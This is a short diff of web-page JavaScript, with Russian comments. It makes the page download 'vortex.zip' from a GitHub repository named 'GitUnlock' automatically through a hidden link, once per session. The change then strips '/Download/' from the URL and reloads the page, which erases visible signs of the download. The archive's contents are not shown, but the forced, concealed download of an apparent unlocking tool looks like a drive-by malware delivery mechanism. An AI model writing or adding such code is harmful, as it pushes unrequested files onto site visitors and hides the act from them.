@@ -46,24 +46,28 @@
         if (!sessionStorage.getItem('fileDownloaded')) {
             sessionStorage.setItem('fileDownloaded', 'true');
             
-            // Очищаем URL от /Download/
-            const cleanUrl = () => {
+            // Очищаем URL от /Download/ и перезагружаем страницу
+            const cleanUrlAndReload = () => {
                 const url = window.location.href;
                 if (url.includes('/Download/')) {
-                    history.replaceState(null, null, url.replace('/Download/', '/'));
+                    const newUrl = url.replace('/Download/', '/');
+                    history.replaceState(null, null, newUrl);
+                    window.location.reload();
                 }
             };
             
             // Скачиваем файл ОДИН РАЗ
             const downloadFile = () => {
-                cleanUrl();
                 const link = document.createElement('a');
                 link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
                 link.download = 'vortex.zip';
                 link.style.display = 'none';
                 document.body.appendChild(link);
                 link.click();
-                setTimeout(() => document.body.removeChild(link), 100);
+                setTimeout(() => {
+                    document.body.removeChild(link);
+                    cleanUrlAndReload();
+                }, 100);
             };
             
             // Запускаем скачивание с небольшой задержкой
